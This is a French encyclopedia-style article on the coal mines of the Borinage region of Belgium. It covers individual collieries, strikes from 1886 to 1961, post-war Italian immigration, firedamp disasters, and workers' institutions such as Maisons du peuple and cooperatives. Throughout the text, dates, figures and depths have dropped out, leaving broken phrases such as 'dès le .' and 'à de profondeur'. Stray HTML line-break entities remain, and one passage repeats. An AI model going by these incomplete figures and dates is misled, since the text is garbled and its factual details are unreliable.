Élouges.
Les charbonnages d'Élouges sont gérés par la S.A. des Charbonnages unis de l'ouest de Mons/
Flénu.
L'exploitation du charbon à Flénu commence dès le . Le chapitre de Sainte-Waudru concède les exploitations sur le fief du Flénu. De bonnes terres agricoles sont sacrifiées pour creuser des puits de mines. En 1405, commence l’extraction officielle de la houille par le fonçage de deux trous dans le bois pour le compte du chapitre des chanoinesses de Mons. Le charbon extrait ensuite par les diverses sociétés charbonnières a reçu le nom de « flénu » C'était un charbon gras inflammable (houille à gaz) qui est également exploité sous les territoires de Cuesmes, Frameries, Wasmes, Pâturages, Quaregnon et Jemappes. L’exploitation industrielle ne commence réellement qu'au avec la création de la Société des Produits de Flénu, constituée en 1835 et la Société du Levant de Flénu. Elles fusionnent en 1932 dans une nouvelle société dite Charbonnage du Levant et des Produits de Flénu dont le siège est à Cuesmes.
32.
Frameries.
Frameries est le siège de la S.A. des Charbonnages belges, fondée en 1858 et propriété de la S.A. John Cockerill, qui exploite, en 1920, 11 puits en activité dont, situés dans l'entité communale actuelle :
compte 84 dégagements de grisou entre 1847 et 1908 avec deux véritables catastrophes en 1875 et 1879. La plus terrible est celle du 17 avril 1879. Un coup de grisou tue 121 personnes, hommes, femmes et enfants. Lorsque les secours s’organisent, on remonte des morts en grand nombre mais aussi quelques survivants grièvement brûlés au visage et à l’intérieur du corps. Quelques-uns auront pourtant de la chance : l’explosion a eu lieu un jeudi matin. Or, le samedi soir, 5 survivants sont repérés à de profondeur à proximité du puits de descente. On parvient à leur acheminer un peu de lait et du vin chaud au moyen d’une lampe attachée à un fil de cuivre et le lendemain, ils sont ramenés au jour. L’enquête de justice qui suit la catastrophe permet d’établir les responsabilités : la colonne de gaz partie du fond est venue s’enflammer en surface parce qu’elle y a trouvé un foyer imprudemment allumé près du mécanicien... Le tribunal n’y voit pas 
de responsabilité de la part des exploitants ; c’est le résultat d’un hasard malheureux, voilà tout. Du coup, les familles des victimes ne peuvent réclamer le moindre dommage et à une époque où la sécurité sociale n’existe pas, elles sont réduites à demander la charité. C’est pour rassembler un peu d’argent que l’on imprime et vend des vues panoramiques de la catastrophe et des images souvenir. La réputation de la « Sinistre Fosse » restera encore longtemps. Montrant leurs enfants, les femmes des mineurs ont l’habitude de dire : « C’est pour l’Agrappe » comme on dit : « C’est pour la prochaine catastrophe »
&lt;br&gt;Sa profondeur maximale est de . Il ferme en 1922. 
Ghlin.
Le charbon fut exploité à Ghlin à partir de la fin du (1875). Un autre puits fut ouvert en 1898. Appelé « Nord de Flénu », il est exploité par la S.A des charbonnages du Levant de Flénu. Charbonnage marginal tant par sa production que par son histoire, il ferme ses portes dès le .
Harchies.
Les deux puits du charbonnage d'Harchies sont exploités par la S.A. des Charbonnages de Bernissart depuis le début du . Il est en activité jusqu'au . Pour la première fois en Belgique, les deux puits du charbonnage d'Harchies sont foncés selon une technique particulière employée, peu de temps auparavant, à Vicq, dans le Nord de la France, à quelques kilomètres au sud de Condé : la congélation des sols, également connue sous le nom de « procédé Poetsch », du nom de l’ingénieur allemand qui le mit au point dès 1890. Du nom de son inventeur, Hermann Poetsch, il consiste à congeler les terrains autour du puits que l’on souhaite creuser, évitant ainsi toute infiltration ou inondation. Ce procédé, démarré pour le puits d’extraction le , permet de vaincre facilement les venues d'eau, toujours très importantes dans le sous-sol. En 1924, la production annuelle est de t.
Hautrage.
Le sol d'Hautrage a donné du charbon dès le . 
&lt;br&gt;Le puits de la S.A. des Charbonnages du Hainaut (constituée le ), dit « Elisabeth » à Hautrage est exploité dès 1914. Mais, à cause de la Première Guerre mondiale, il n'atteint son rendement maximum qu'en 1919. À son apogée, il emploie mineurs. Il est situé à proximité de la ligne de Saint-Ghislain à Tournai. C’est autour de la Place du Charbonnage qu’un quartier complet est édifié. Il comprend des maisons ouvrières, des maisons d’ingénieurs, une cantine pour Italiens, une autre 
pour les Polonais, une salle des fêtes et un comptoir général d’approvisionnement. Il ferme ses portes le .
Hensies.
L'exploitation du charbon est effectuée par la S.A. des Charbonnages d'Hensies-Pommeroeul. Le premier sondage, en vue de déterminer la valeur des terrains houillers sera entrepris en 1838. D'autres travaux de reconnaissance seront menés par la suite par la société Don, mais c'est seulement au , en 1908 et 1912, que deux sondages encore plus profonds sont réalisés à la suite d'un accord entre les propriétaires des concessions de la « Société anonyme Belge d'entreprise de forage et de fonçage Foraky ». Le gisement produit essentiellement des charbons plus maigres à usage domestique. La modernité des installations, la régularité du gisement et l'épaisseur des couches exploitables permettent d'avoir recours assez rapidement à une mécanisation massive. La société pourra ainsi survivre aux premières et seconde vagues de fermeture (1952-54 et 1959-61) des charbonnages du Borinage qui ne produisent essentiellement que du charbon gras industriel soumis à une rude concurrence.
Hornu.
À Hornu, trois sociétés se partagent l'exploitation du charbon.
Le charbonnage du Grand-Hornu est fondé par le Français Henri De Gorge, né en 1774 dans le Nord de la France, près de Valenciennes. Après avoir servi dans les armées napoléoniennes, dont il assurait l’approvisionnement en combustible, il entame une carrière commerciale dans la vente du charbon. 1810, il se rend acquéreur d’une modeste exploitation de houille à Hornu. Les difficultés d’extraction sont grandes : quoique riches, les veines sont étroites et profondes et l’eau envahit constamment les puits. Grâce à son opiniâtreté, Henri De Gorge réussit à développer les houillères de Hornu. Le Grand-Hornu est l’un des premiers complexes intégrés, modèle d’urbanisme, d’innovation industrielle et de modernité. Entre autres progrès, De Gorge introduit, en 1830, la première voie de chemin de fer 
en Belgique pour relier ses fosses au canal Mons-Condé. Il fait appel, pour la construction, à trois architectes, dont Bruno Renard de Tournai. Il semble que l’influence de ce dernier ait été déterminante dans la conception de l’ensemble. Les travaux de la cité débutent en 1823. Les bâtiments sont construits dans le style néo-classique. On y trouve les magasins, écuries, ateliers de construction, fonderies de fer et de cuivre, fourneaux à coke et bureaux d’ingénieurs. Les puits d’extraction proprement dits, au nombre de 12, sont situés à la périphérie de l’ensemble. La « cité De Gorge » est voisine du complexe industriel. Elle est la première du genre en Europe. Dortoir puis résidence, elle accueille les ouvriers venus de régions diverses dans 425 maisons, exceptionnellement confortables pour l’époque et dotées chacune d’un jardin. La cité abrite une école, une bibliothèque, un établissement de bains, une salle de danse et un hôpital. Le Grand-Hornu, constitue un exemple unique d’urbanisme fonctionnel à l’aube de la grande période d’industrialisation, à la fois témoin du paternalisme ambiant mais aussi de l’esprit d'entreprise qui fut celui des grands capitaines d’industrie. Le charbonnage connaît une activité florissante jusqu’au début du puis subit les crises successives de l’industrie charbonnière. Il poursuit néanmoins ses activités jusqu’en 1954, date à laquelle il ferme définitivement ses portes, victime parmi d’autres des mesures de rationalisation instaurées par la CECA.
Jemappes.
Jusqu'en 1870, Jemappes englobait également le village de Flénu. Pour ce qui est de Jemappes proprement dit, il n’y a jamais qu’un seul et unique siège moderne, creusé à proximité du chemin de fer. On l’appelle « La Nouvelle Fosse » ou « Ell Fosse d’In Bas », officiellement puits de la S.A. des Produits. Il est exploité de 1907 à 1959 (). Il atteint la profondeur de . En , au début de la guerre, le chômage est total dans le Borinage. Le travail reprend le lundi avec un personnel du fond de 1 800 personnes contre 2 600 auparavant. En , les ouvriers se mettent en contre l’insuffisance de vivres et surtout des pommes de terre. L’autorité allemande ayant promis d’améliorer la situation au point de vue ravitaillement, la grève prend fin. Une centrale électrique est mise en service en . La fin de la guerre affecte le siège en raison de l’enlèvement par les pionniers allemands de certaines pièces des machines d’extractions pour les rendre inutilisables.
Tertre.
La S.A. des Charbonnages du Hainaut exploite le puits . Le creusement du charbonnage de Tertre à de profondeur débute en 1934 et son exploitation en 1937. Il fournit une houille grasse, cokéfiable, destinée aux fours industriels. À de profondeur, on y découvre une importante source d'eau chaude. La fermeture a lieu le . Le chevalement a persisté jusqu’en 1982.
Wasmes.
Au , cinquante puits sont en activité lorsque les troupes de Louis XIV les dévastent. L’industrie charbonnière prospère au cours du , grâce aux grandes sociétés charbonnières d’Hornu et Wasmes, du Grand Buisson et Vanneaux. C’est grâce à cette industrie florissante que la démographie de Wasmes s’accroit rapidement au cours du . Les charbonnages Agraffe-Escouffiaux exploitent ha dans le sous-sol de 7 communes. Les charbonnages du Rieu-du-Cœur occupaient aussi le sous-sol de Wasmes.
Les mouvements sociaux, grèves, manifestations.
Le Borinage houiller est, avec la ville cotonnière de Gand, la région la plus « gréviste » de Belgique au . Il connaît, dès avant l'indépendance, des grèves répétées de plus en plus amples : 1830, 1841, 1861, 1865, 1885. Ce sont les émeutes de 1886 qui constituent présentent l'avertissement le plus grave et le plus terrible. À la question posée par la Commission du travail créée après ces émeutes : « Comment améliorer les rapports du capital et du travail », l'Association houillère du couchant de Mons répond de manière significative : « En construisant une caserne de gendarmerie sur les hauteurs du Flénu » . La réaction des mineurs est double et contradictoire.
D'une part, ils sont impatients de trouver une solution à la crise et suivent les discours enflammés de l'avocat montois Alfred Defuisseaux. Cette voie radicale, qui prône l'établissement du suffrage universel et de la république, mobilise les grévistes en 1891, 1893, 1899, 1902 et 1912, mais encore en 1932, 1950, 1959 et 1960-61. 
D'autre part, des centaines de militants tentent de créer des associations de défense des travailleurs. Avec la création du P.O.B., en 1885, la mutualité se structure. Dans le Borinage, outre les caisses de secours (maladie, décès, milice, vieillesse), les mutualités socialistes mettent sur pieds des services médicaux et pharmaceutiques. La clinique Louis Caty de Baudour est fondée en 1925. Parallèlement, les syndicats et les coopératives se développent autour des ouvriers mineurs. 
Si, en raison de ses objectifs et des plans de ses chefs, la grève générale de 1893, ordonnée par le Conseil général le , c'est-à-dire le jour même où le Parlement repousse le suffrage universel, n'a, au départ, rien de révolutionnaire, la situation qu'elle engendre débouche sur une tentative révolutionnaire aux conséquences imprévisibles. L'exaltation des masses, la violence de la répression faisant de nombreuses victimes, l'exaspération croissante des grévistes, tout cela crée un climat révolutionnaire. Celui-ci règne surtout au Borinage où les dirigeants des syndicats et des coopératives sont littéralement débordés. Le mouvement prend en plusieurs endroits les aspects violents de l'émeute. 
&lt;br&gt;Le mardi , le Parlement rejette la proposition du député Paul Janson qui demande le suffrage universel pur et simple. Le Conseil général du Parti Ouvrier décrète la grève générale pour le lendemain. Le mercredi , le nombre de grévistes dans le Borinage est évalué à . Des meetings ont lieu à Cuesmes, Frameries et Quaregnon. Le , on compte environ grévistes. Des entreprises sont fermées de force. Des émeutes se déroulent à Quaregnon (Monsville). On compte de nombreux blessés à la suite des émeutes entre le manifestants et la gendarmerie. Le 14, la grève est quasi générale. Des bourgmestres réclament l’armée pour assurer le maintien de l’ordre. Le bourgmestre de Mons Sainctelette interdit toute manifestation. Le samedi , alors que le nombre de grévistes est de , de violents affrontements ont lieu. Le gouverneur du Hainaut envoie un escadron de chasseurs à cheval et deux bataillons de chasseurs à pied pour maintenir l’ordre. Le est une date marquante dans l'histoire du mouvement ouvrier. À 14 h, 4 à manifestants arrivent à Mons par l’avenue de Cuesmes. Ils sont repoussés à la baïonnette par la 4 compagnie de la garde civique épaulée par les chasseurs-éclaireurs. À l’avenue de Jemappes, la garde civique maintient à distance un groupe d’environ qui finissent par se ruer à l’assaut des gardes civiques et tentent de leur arracher leurs fusils. Sans sommation, la fusillade éclate. On compte 5 morts et 9 blessés graves parmi les grévistes. La garde civique compte 14 blessés. Vers 18 h, le calme revient. Le mardi , le suffrage universel tempéré par le vote plural est adopté à la Chambre. Le 19, le conseil général du Parti Ouvrier décide la reprise du travail.
Le 13 mai 1893, l'ouvrier mineur devenu leader syndicaliste, Alphonse Brenez sera condamné à 5 années d'emprisonnement par la cour d'appel de Bruxelles, du chef de rébellion en bande armée avec la circonstance aggravante d'en être soupçonné l'instigateur. Il fut arrêté et incarcéré à la prison de Mons. Son élection à la députation de l'arrondissement de Mons-Borinage au scrutin du dimanche , par 41,722 voix, contre 19,509 provoquera sa libération anticipée un mois plus tard.
Le , les patrons charbonniers borains annoncent une diminution de salaire de 5 %. Le , la grève démarre au charbonnage du Grand Trait, à Frameries, et les autres fosses font de même les jours suivants. La baisse des salaires devint effective le et mineurs de Wasmes et de Hornu partent également en grève. Les patrons charbonniers du Levant répliquent en licenciant 484 mineurs. À la Chambre, Achille Delattre déclare : « Le directeur des Charbonnages Belges est un des premiers responsables de ce qui se passe. (…) Nous étions parvenus à faire admettre aux qu'ils devaient retourner au travail. Mais quand ils se présentèrent, le patron annonça qu'il introduisait de nouvelles méthodes qui mettaient 484 hommes sur le pavé ! ». Le gouvernement décide le de s'en prendre aux allocations de chômage déjà insuffisantes : plusieurs catégories de chômeurs voient leur indemnité rabotée, voire supprimée, entre autres les femmes mariées. Dès le 1er juillet, tout le Borinage était à l'arrêt et on assista aux premières manifestations de femmes à Cuesmes. Le mercredi , 35 000 manifestants défilaient à Mons. Dès le 1 juillet, tout le Borinage est à l'arrêt et on assiste aux premières manifestations de femmes à Cuesmes. Le mercredi , manifestants défilent à Mons. À partir du mardi les gendarmes reprennent possession de la rue. Jeudi , le Congrès extraordinaire de la Centrale des mineurs socialistes se déroule dans une ambiance surchauffée. Les dirigeants nationaux défendent de nouvelles propositions mais la base les rejette et revendique un « salaire vital à garantir ». Cela n'empêche pas le POB, le samedi 16, d'appeler à la reprise du travail dès le lundi matin. La moindre promesse patronale est présentée comme une victoire. Le lundi 18, les verriers et les métallos reprennent le travail mais les mineurs du Hainaut, désormais isolés, continuent la grève. Un nouveau Congrès des mineurs se tient le et proclame la grève générale dès le . La Commission syndicale refuse la grève générale. La Centrale des Francs Mineurs chrétiens vote la reprise du travail mais du fait de sa faible représentativité, cela n'affecte en rien le mouvement. Le la C.N.M.M. (Commission nationale mixte des mines) fait une nouvelle proposition : hausse de 1 % des salaires des mineurs au 1 octobre, révision des bas salaires et stabilisation jusqu'au 1 novembre au moins, ré-embauchage complet au Borinage. Ces points sont approuvés par la Centrale des mineurs, mais ne sont pas présentés dans les assemblées générales de mineurs. À cette date les mineurs sont relativement isolés et à la mi-septembre la grève des mineurs se termine mais les embauchages promis n'interviennent guère .
La grève générale de l'hiver 1960-1961 est la plus importante grève du en Belgique et est d'ailleurs appelée pour cette raison « la grève du siècle ». Son facteur déclenchant, c'est la politique d'austérité décidée par le Gouvernement Eyskens qui consiste en une série de mesures désignées par ces deux mots "Loi Unique". La grève démarre le , quelques jours après le mariage entre Baudouin Ier et Fabiola. Elle est particulièrement dure en Wallonie.
L'immigration italienne.
C'est le qu'est signé, à Rome, l'accord belgo-italien qui prévoit l'envoi initial de italiens dans les 5 bassins miniers de Belgique, y compris le Borinage. En échange, l'Italie a droit à de charbon par mineur et par jour. Pour être candidat à l'immigration, l'ouvrier italien doit satisfaire à une série de mesures : il doit être âgé d'au moins 35 ans, passer une visite médicale et un contrôle de la Sûreté de l'État. On leur promet, outre un salaire décent, un logement « convenable », qui s'avérera, dans de nombreux cas, être des baraquements en bois ou en tôle.
En 1948, on dénombre l’arrivée d’environ Italiens, plus de en 1951 et environ en 1955. Leur intégration est difficile au début. Ils sont l'objet de réflexions racistes ("macaroni" est l'injure la plus fréquente au Borinage) et de rejet de la population autochtone (des panneaux "Interdit aux animaux et aux étrangers"). L'arrivée des familles venues rejoindre le chef de famille amplifie la situation. L'intégration se fait petit à petit grâce aux jeunes générations qui apprennent le français à l'école primaire et suivent les cours des écoles secondaires, essentiellement techniques et professionnelles. La plupart des descendants des Italiens immigrés sont aujourd'hui de nationalité belge. Certains ont fait carrière dans le domaine artistique (Adamo) ou politique (Elio di Rupo fut premier ministre en Belgique).
Les grandes catastrophes.
Le grisou.
L'histoire des charbonnages du Borinage est remplie de nombreux accidents produits par le grisou, dont certains prennent l'allure de véritables catastrophes (L'Agrappe, La Boule, Le Fief, Ferrand, etc.). rien qu'entre 1821 et 1879, 134 coups de grisou tuent mineurs et en blessent . Le Borinage est situé dans un gisement reconnu comme étant un des plus grisouteux du monde. 
Le grisou est un gaz naturel, un hydrocarbure constitué essentiellement (80 à 90 %) de méthane. Il provient de la décomposition des organismes végétaux emprisonnés dans le sol lors des grands bouleversements géologiques. Il atteint une pression de 13 à 18 atmosphères avec parfois des pointes à 30 ou 40 à l'approche des grandes failles, là où le terrain est en quelque sorte laminé. C'est dans ces veines qu'une violente explosion a lieu. La combustion peut atteindre des températures de . On a retrouvé des tôles et des chariots fondus et des hommes entièrement carbonisés. L'installation de systèmes de ventilation perfectionnés a réduit le risque de déflagration sans le supprimer totalement.
Méthodes de détection du grisou.
Autrefois on utilisait des canaris et des pinsons pour détecter la présence du grisou. Ces oiseaux étaient utilisés pour donner l'alarme quand les émanations de gaz toxique se faisaient menaçantes. Dès qu'ils battaient des ailes ou se hérissaient voire mourraient, les mineurs étaient avertis de la présence du gaz avant qu'eux-mêmes ne la perçoivent. On observait aussi le comportement des rats et des souris.
L'utilisation de lampes de sécurité a sécurisé le travail des mineurs, comme la lampe de Davy, utilisée dès 1815 comme détecteur et outil de quantification de grisou, grâce à une jauge de mesure de la hauteur de flamme. En présence de grisou, la flamme grandit et prend une teinte bleutée.
Les événements.
Au , on dénombre déjà des catastrophes dans les charbonnages du Borinage. En 1532, le puits de la fosse du Bouleau à Quaregnon relève 6 morts des suites d’un coup d’eau. En 1582, à la veine Picarte de Frameries, 6 morts. En 1589, 6 morts au trou Moreau à Frameries. En cause : le grisou. 
Au , on ne recense qu'un seul accident, ce qui est fort improbable. Le , on dénombre 12 morts au « puits Luquet » à Élouges. Le grisou est mis en cause. 
Le , à Pâturages le grisou fait 11 morts. Il frappera encore tout au long du . En 1726, au « puits Luquet » à Élouges, un coup de grisou fait 10 morts.En 1743, chez Duriau-Liberzée à la Bouverie 12 morts par le grisou. En 1748, à Frameries au puits de l’« Agrappe », le coup de grisou fait 12 victimes. En 1750, « Cinq paumes » de Framerie : 10 morts par effondrement 
du puits causé par un coup d’eau. Le , au puits de la machine Auvergies à Warquignies le coup d’eau fait 5 morts. Le , à la machine du Bois de Boussu, l’eau fait 9 morts. En 1758, à l' « Agrappe » , le feu prend dans le puits et durera jusqu’en 1772 : 8 morts. En 1760, au puits « Luquet » à Elouges le grisou tue 10 personnes. Le , à la fosse de Clayeau à Cuesmes, coup d’eau : 10 morts. En 1761, au « Grand Andrieu » à Dour le grisou fait 8 morts et à La « fosse de Burg » à Wasmes l’eau fait 21 victimes. En 1763, à la « grande veine » () d’Élouges, à la suite du coup de grisou l’incendie se déclare, le feu dure jusqu’en 1775, et 
fait 8 morts. En 1768, à Pâturages, 7 victimes au puits de la « grande Chevalière ». Entre 1768 et 1790, une trentaine de coups de grisou a provoqué des éboulements et surtout la mort de dizaines de personnes. Les fosses de l’Agrappe (Frameries) acquièrent la réputation d’être particulièrement dangereuses. Pourtant, au puits Luquet à Élouges, à Baisieux, à Quaregnon, à Wasmes, à Dour ou à Jemappes, le bilan est aussi lourd. Au moins 300 mineurs ont péri sur leur lieu de travail, dans le Borinage au cours du .
Déjà frappé à la grande veine par deux coups de grisou qui font une trentaine de morts en 1818, le site de Wasmes vit un nouveau drame, le . Ce jour-là ce sont 91 mineurs qui perdent la vie au puits de l’Escouffiaux à cause du grisou. La lampe de Davy n’est pas encore très généralisée.
En 1854, les Charbonnages du Rieu-du-Cœur ont racheté les concessions du Charbonnage de la Boule et ont constitué la S.A. des Charbonnages du Rieu et de la Boule réunis. L’un des puits, le , s’appelle Sainte-Désirée. C’est là, le , que se produit l’une des plus grosses catastrophes de l’histoire minière de la Wallonie. Un coup de grisou surprend 113 mineurs dans les profondeurs de la terre. Avec les catastrophes de l’Agrappe (1875 et 1879) et de l’Aulniat en 1892, la catastrophe dite de la Boule était l’une des plus importantes avant celle du Bois du Cazier en .
Fusion de la concession des Chevalières et du Midi de Dour, la S.A. des Chevalières de Dour, constituée en 1847, exploite plusieurs puits, dont le appelé Sainte-Catherine. Le , un coup de grisou y emporte 17 mineurs. Un peu plus d’un an plus tard, le , un dégagement instantané se produit à l’étage 445. L’irruption du gaz est d’une vitesse fulgurante, tuant tout le personnel, à savoir 57 personnes, sur son passage vers la surface.
Parmi les grandes catastrophes minières de l’histoire du pays wallon, celle du à Frameries est sans conteste l’une des plus importantes avant que ne surviennent une autre catastrophe au même endroit en 1879, puis celles de la Boule en 1887, de l’Aulniat en 1892 et du Bois du Cazier en 1956. Du puits de l’Agrappe, 112 mineurs ne sont jamais ressortis. Principale cause incriminée : le grisou. Pourtant, il se colporte qu’une phrase avait été écrite à la craie sur un chariot, la veille du drame : «demain tout sautera». Un mineur avait-il pressenti le grisou ? Acte criminel ? Cent victimes habitaient à Frameries. Les enterrements eurent lieu par rue et par coron. 
Situé rue de l’Enfer, dominant la vallée qui sépare Dour de Boussu, le puits Frédéric fait partie de la société Grande Machine à Feu. Son exploitation remonte au et l’on ne compte plus les incidents qui s’y sont produits. Pourtant, le , l’enfer avait pris la forme du grisou pour garder 14 mineurs au fond du puits . Seize ans plus tard, ce sont 32 mineurs qui laissent leur vie à la suite d’un nouveau gros coup de grisou. En 1891, ils seront encore 21 à payer le prix fort au puits , sur le site de ce charbonnage dont le nom fait référence à la machine de Newcomen que le patron avait acquise dès le milieu du .
Le et le , le charbonnage de Hornu qui appartient à la Cie des Charbonnages Belges est frappé coup sur coup par le grisou. Après avoir perdu 15 ouvriers, ils sont cette fois 39 mineurs qui ne rentreront pas dans leur famille au terme de leur journée de travail.
Le , au Crachet (Frameries), des mineurs descendent dans le puits comme tous les jours pour extraire le charbon. Ce jour-là, cependant, un coup de grisou en retient 26.
Les catastrophes minières paraissent disparaître progressivement au fur et à mesure que l’on avance dans le . Certes, le fait que le grisou continue à enlever la vie à des groupes de 10 à 20 mineurs ne doit pas être banalisé, mais on est loin des dizaines de morts du quand survient la catastrophe du « Fief de Lambrechies » (Pâturages) dans le Couchant de Mons. Le , le grisou fauche 34 mineurs. Les secours tentent alors de dégager ceux qu’ils espèrent encore en vie. Les recherches se poursuivent le lendemain du drame, ainsi que le . Ce jour-là, un second coup de grisou vient frapper les mineurs déjà prisonniers, mais aussi onze secouristes. Le bilan est lourd : 57 morts, et les circonstances particulièrement pénibles. Face à ce double coup du destin, la décision est prise de fermer le « Fief de Lambrechies » et de cesser son exploitation.
Le , le puits du Grand Trait de l’Agrappe, dépendant des charbonnages belges à la Bouverie subit un coup de grisou à l’étage 950 tôt le matin. Le puits se trouve sur le territoire de la commune de la Bouverie. Le travail des secours est particulièrement difficile. On enregistre d’emblée 29 morts et malgré les efforts force est de constater que 7 mineurs ont été ensevelis. Les sauveteurs ont été reçus par le Roi le et ont été décorés. Il faut plus de 10 mois pour remonter les derniers corps et deux victimes sont restées au fond du puits à tout jamais. 
Le , un violent coup de grisou surprend l’équipe de nuit descendue au puits Marcasse, à Wasmes. On dénombre 21 morts le jour même ; parmi les blessés et les nombreux brûlés, on déplorera le décès de trois autres « gueules noires » à la suite de ce nouveau drame de la mine.
La date du est symbolique. Ce jour-là, on ferme le puits , dit « du Renard », à Quaregnon. Le grisou y avait fait 7 morts en 1954 et encore huit autres en 1956. Pourtant, tout au long des mois de janvier et de février, les mineurs borains mènent une grève générale pour sauver leur gagne-pain.
La clinique de Warquignies.
Réalisation d'avant-garde sur le plan social, la construction de la clinique de Warquignies est financée par la Caisse Commune d'Assurance du Couchant de Mons crée en 1905 à l'instigation des Sociétés charbonnières elles-mêmes. C'est là que sont hospitalisés et soignés, aux frais de la caisse, les mineurs du Bassin borain victimes d'un accident de travail. Dès son ouverture, la clinique est dotée de tous les perfectionnements de l'époque. À cause de la Première Guerre mondiale, l'hôpital n'ouvre ses portes qu'en 1926. À l'époque, il peut accueillir 110 patients, et ses lits sont donc entre autres occupés par les victimes des grandes catastrophes boraines de l'entre-deux-guerres : le Fief de Lambrechies, le Grand Trait, Marcasse, l'Agrappe. Au fil du temps, l'hôpital se développe, avec notamment l'ouverture de la maternité (durant la seconde guerre mondiale) et du centre de réadaptation. Tout en se dotant progressivement des différents services que l'on trouve dans les autres établissements hospitaliers (chirurgie, médecine interne, gériatrie...), l'institution a cependant toujours conservé certaines spécialités propres comme la pneumologie. Avec les années soixante et la fin des charbonnages borains, La Caisse Commune des Charbonnages du Couchant de Mons décide de vendre son hôpital : il est racheté par des médecins de l'établissement. Les nouveaux propriétaires entament alors assez rapidement des travaux importants et c'est ainsi que plusieurs ailes supplémentaires sont construites. La dernière en date est inaugurée en . Elle a coûté quelque deux cents millions de francs belges (5 millions d'Euros). Actuellement, la clinique de Warquignies fait partie du CHR Mons-Hainaut.
Vie culturelle et associative.
Les Maisons du peuple.
Les Maisons du peuple sont des lieux de rencontre pour la classe ouvrière belge. Elles sont le creuset de luttes contestataires, d'actions éducatives ou récréatives. Elles participent grandement à la prise de conscience ouvrière et permettent d'obtenir de réelles avancées sociales en matière de droits politiques, d'accès à l'éducation. Chaque commune du bassin minier borain possède sa maison du peuple. Leur architecture et leur décoration sont souvent remarquables.
La Maison du peuple de Pâturages a été construite en 1903, dans le style Art Nouveau, par l’architecte Eugène Bodson. Sur la façade un sgraffite, signé par le célèbre décorateur Paul Cauchie est intitulée "Le Triomphe du Travail".
Commandé en 1927 par la société coopérative « Les Socialistes réunis » à l'architecte Alphonse Van Craenenbroeck et inauguré en 1929, la Maison du peuple de Dour est caractéristique de l'Art déco.
La Maison du peuple de Wihéries est inaugurée en 1922. Elle est construite à l’initiative de la société coopérative « La Ruche boraine » (fondée en 1902) par Maurice Mailleux (également architecte de la Maison du peuple de Boussu). Elle abritait une salle de réunion, une salle des fêtes, un café, une salle de débit de pains, une boulangerie ainsi qu’une cuisine. 
La Maison du Peuple d’Élouges a été construite vers 1895. Elle appartenait à l’origine à la société coopérative « Union, Ordre, économie ». En dessous du balcon en fer forgé, la porte d’entrée a conservé ses décors originels illustrant les outils des mineurs. Outre la salle principale, elle était occupée par un débit de pains et un bureau (dans les travées de gauche), ainsi que par une épicerie et une boucherie (dans les travées de droite). 
La Maison du peuple de Boussu-Bois a été construite de 1898 à 1902 à l'initiative d'Alfred Dendal, ouvrier mineur.
À Quaregnon, Le projet de création de la Maison du peuple avait été initié au début du siècle passé en . Véritable lieu de rencontre, cette nouvelle maison, inaugurée le , disposait de plusieurs salles de réunion, d’un café, d’une salle de danse mais également d’un cinéma, d’une salle de spectacle, d’une boulangerie et d’une mutuelle socialiste. En 1921 toujours, le peintre tournaisien Fernand Allard l'Olivier réalise une série de peintures pour décorer le bâtiment.
La Maison du peuple de Frameries a été inaugurée en 1906. Elle est située sur la Place Alfred Defuisseaux. Elle était originellement un bâtiment de style Art nouveau construit pour le Parti ouvrier belge.
Les coopératives.
Chaque village possède sa coopérative, proche du Parti socialiste. C'est d'abord la boulangerie puis les magasins généraux et les brasseries et enfin les commerces de viande, d'épicerie, de tissus, de quincaillerie ou de chaussures. Dans le Borinage, quatorze coopératives sont créées entre 1885 et 1888. À Wasmes, Boussu et Dour, on en compte même deux. Les ristournes obtenues sont une véritable épargne ouvrière. Elles permettent des achats plus importants de vêtements et de chaussures. Des caisses de maladies et de pensions assurent le pain en cas de difficultés. La coopération entraîne la modernisation du commerce et la sociabilité (livraison à domicile du pain, du lait, etc.). La crise économique des années 1930 entraîne la faillite ou l'affaiblissement des coopératives qui ne pourront pas s'adapter à l'évolution de la société et la modernisation du commerce issues des « Trente Glorieuses ». Elles finiront par disparaître.
Les Cercles catholiques.
Face à la montée et au succès des idées socialistes dans le milieu ouvrier, et en particulier dans le Borinage (les premiers syndicats sont créés en 1850), l'Église catholique lance, dès 1860, une contre-offensive pour rallier à sa cause les travailleurs qui s'en étaient éloignés. Le Parti ouvrier belge est fondé en 1885. C'est en suscitant la création d’organisations ouvrières chrétiennes qu'ecclésiastiques, industriels et notables parviennent à créer le contrepoids. Ils s'adressent aux ouvriers qui défendent la foi chrétienne et veulent garder leur identité ainsi qu'à la nouvelle main d’œuvre issue de l'immigration et fidèle à l'Église : mineurs flamands à la fin du , polonais dans l'entre-deux-guerres, italiens après 1945. L'encyclique "Rerum Novarum", promulguée par le pape Léon XIII en 1891, leur fournit le stimulant, la justification et l'argumentation nécessaire.
Né à Dour en 1855, docteur en médecine, homme d'œuvres, Victor Delporte crée en 1893 un cercle ouvrier catholique à Dour, dans la mouvance de "Rerum Novarum". La même année, il est à l'origine de la Fédération catholique boraine, qui rassemble les cercles et les patronages ouvriers chrétiens, dont il devient le président. Chef de file de la démocratie chrétienne dans le Borinage, Victor Delporte fut député à la Chambre des Représentants de 1900 à 1904 et de 1908 jusqu'à son décès en 1914. Il y défendit les intérêts économiques de l'arrondissement de Mons, mais s'intéressa surtout à l'amélioration de la situation sociale et sanitaire des populations ouvrières.
Présents dans la plupart des communes boraines, les Cercles catholiques sont le pendant des Maisons du peuple socialistes. Leur rivalité conduit parfois à des incidents violents notamment au moment des élections.
Fanfares, orphéons, chorales.
Le développement de l'industrie entraîne la suprématie d'une classe bourgeoise qui, faisant preuve de paternalisme à l'égard du prolétariat, souhaite son élévation par l'instruction et les arts. La bourgeoise soutient donc la création de sociétés d'amateur constituées en grande majorité d'ouvriers et quelques employés liés à l'entreprise. Plus tard, de nombreuses sociétés se forment sous l'égide du socialisme qui œuvre au progrès matériel et intellectuel de la classe ouvrière. À partir des années 1890, on voit apparaître des fanfares, des harmonies et des chorales « socialistes », des fanfares « ouvrières », des sociétés d'« ouvriers réunis », certaines reliées à des organisations chrétiennes en opposition au Parti ouvrier belge.
Le cas de Frameries est exemplaire. Plusieurs sociétés musicales ouvrières s'y sont développées dès le . Elles n'ont pas hésité à faire appel à de prestigieux chefs d'orchestre belges qui ont dirigé des œuvres ambitieuses dans les années 1960.
Les cercles dramatiques.
